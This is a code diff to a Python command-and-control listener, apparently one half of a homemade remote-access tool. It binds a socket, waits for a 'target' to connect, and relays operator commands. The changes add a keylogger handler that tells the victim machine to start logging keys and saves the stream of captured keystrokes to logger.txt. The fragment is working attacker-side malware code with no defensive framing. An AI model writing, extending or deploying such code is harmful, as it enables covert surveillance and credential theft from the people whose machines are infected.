@@ -4,13 +4,12 @@ import sys
 
 sock = st.socket(st.AF_INET,st.SOCK_STREAM)
 sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
-sock.bind(('192.168.6.119',2222))
+sock.bind(('192.168.6.54',2222))
 sock.listen()
+
 con,addr = sock.accept()
-
-
 try:
-    while con:
+    if con:
         system('clear')
         print('[*] Connection established to the target')
 
@@ -38,8 +37,18 @@ try:
                     print(e)
 
             elif cmd == 'log keys':
-                print(con.recv(1024).decode())
-
+                con.send(cmd.encode())
+                try:
+                    print('start keylogger...')
+                    while True:
+                        getlogs = con.recv(1024).decode()
+                        with open('logger.txt','a') as log:
+                            log.write(getlogs)
+                except Exception as e:
+                    print(e)
+                except KeyboardInterrupt:
+                    print('Keylogger stopped')
+                    continue
             elif cmd in ('quite','exit'):
                 con.close()
                 system('clear')
